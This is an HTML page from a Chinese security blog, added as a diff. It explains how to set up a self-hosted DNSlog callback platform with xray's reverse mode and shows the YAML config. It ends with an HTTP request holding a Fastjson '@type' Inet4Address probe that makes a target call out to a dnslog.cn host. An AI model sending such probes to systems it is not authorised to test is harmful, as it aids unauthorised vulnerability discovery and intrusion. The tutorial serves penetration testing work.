@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>dnslog平台 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="工具教程,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 持续更新中</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-11-12
+    </span>
+    
+      <span>
+        | <a href="/categories/工具教程/"><i class="fa fa-bookmark"></i>工具教程</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    dnslog平台
+  </h1>
+  
+  <article class="passage-article">
+    <h2 id="0x02-准备零件"><a href="#0x02-准备零件" class="headerlink" title="0x02 准备零件"></a>0x02 准备零件</h2><p>1.一台服务器安装xray。<br>2.在阿里云购买域名,需要有设定DNS Host的功能.<br>配置过程</p>
+<p>Host功能处创建2个DNS服务器，比如设置sven1.dnslog.cool,sven2.dnslog.cool，IP地址填写服务器ip:123.321.213.2</p>
+<p>3.DNS修改：前往DNS修改功能，修改dns服务器为sven1.dnslog.cool,sven2.dnslog.cool</p>
+<p>4.域名解析：然后点击左边的域名解析功能，填加2条解析记录，主机记录填写sven1，记录类型为A，解析线路为默认，记录值为123.321.213.2(自己服务器ip)，剩下默认即可，第二条解析记录的主机记录填写sven2，其他同上条.</p>
+<p>5.下载xray，先使用命令行xray.exe reverse运行一遍，自动生成config.yaml，然后打开config.yaml，找到配置反连平台得配置（270行上下十来行都是），替换成如下程度，按照自己实际情况更换密码和ip和域名和dns服务器的前缀后运行xray（xray.exe reverse），<br>行完毕后访问链接：<a href="http://123.321.213.2:8001，就是dnslog管理平台了。" target="_blank" rel="noopener">http://123.321.213.2:8001，就是dnslog管理平台了。</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">reverse:</span><br><span class="line">  db_file_path: &quot;reverse.db&quot;</span><br><span class="line">  token: &quot;123!@#QWE&quot;           //此处是设置登录反连平台得密码      </span><br><span class="line">  http:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    listen_port: &quot;8001&quot;</span><br><span class="line">  dns:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    domain: &quot;dnslog.cool&quot;</span><br><span class="line">    is_domain_name_server: false</span><br><span class="line">    # 静态解析规则</span><br><span class="line">    resolve:</span><br><span class="line">    - type: A</span><br><span class="line">      record: sven1</span><br><span class="line">      value: 123.321.213.2</span><br><span class="line">      ttl: 60</span><br><span class="line">    - type: A</span><br><span class="line">      record: sven2</span><br><span class="line">      ttl: 60</span><br><span class="line">      value: 123.321.213.2</span><br><span class="line">  rmi:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    listen_port: 8088</span><br><span class="line">    resolve:</span><br><span class="line">    - type: A # A, AAAA, TXT 三种</span><br><span class="line">      record: localhost</span><br><span class="line">      value: 127.0.0.1</span><br><span class="line">      ttl: 60</span><br><span class="line">  client:</span><br><span class="line">    http_base_url: &quot;&quot;</span><br><span class="line">    dns_server_ip: &quot;123.321.213.2&quot;</span><br><span class="line">    remote_server: false</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1   关键</span><br><span class="line">Host: 80.240.18.74:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">content-type:application/json              关键</span><br><span class="line">Content-Length: 64</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;8hn8to.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-准备零件"><span class="toc-text">0x02 准备零件</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2020/11/12/工具教程/dnslog平台/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2020/11/12/工具教程/shadowsocks/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2020/11/12/工具教程/w11scan/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
